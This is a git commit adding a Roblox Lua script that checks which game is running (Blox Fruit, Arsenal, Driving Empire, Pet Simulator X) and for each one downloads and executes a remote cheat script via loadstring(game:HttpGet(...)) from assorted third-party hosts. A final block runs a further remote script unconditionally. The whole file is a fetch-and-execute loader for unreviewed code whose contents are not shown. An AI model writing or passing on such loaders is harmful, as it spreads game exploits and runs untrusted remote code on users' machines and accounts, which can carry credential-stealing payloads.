534cfe4ea58f631839cf6a2c6da4933de896ff64
DrownHub <136701934+DrownHub@users.noreply.github.com>
2023-06-16 16:55:55 +0800

    Create ScriptsUniversal.lua

---
+++ Ultimate/ScriptsUniversal.lua
@@ -0,0 +1,28 @@
+--Blox Fruit
+if game.PlaceId == 2753915549 then
+ 
+loadstring(game:HttpGet("https://isnahamzahpastebin.tech/gratis/ZeeHub.lua"))()
+end
+
+--Arsenal
+if game.PlaceId == 286090429 then
+
+loadstring(game:HttpGet(("https://raw.githubusercontent.com/Maikderninja/Maikderninja/main/PWNERHUB.lua"), true))()
+end
+
+--Driving Empire
+if game.PlaceId == 3351674303 then
+
+loadstring(game:HttpGet('https://ppearl.vercel.app'))()
+end
+
+--Pet Simulator x
+if game.PlaceId == 6284583030 then
+
+loadstring(game:HttpGetAsync("https://blacktrap.org/blacktrap/users/checkpoint/Auth.txt"))()
+end
+
+if not game.PlaceId == false then
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/DrownHub/HUB/main/Ultimate"))()
+end
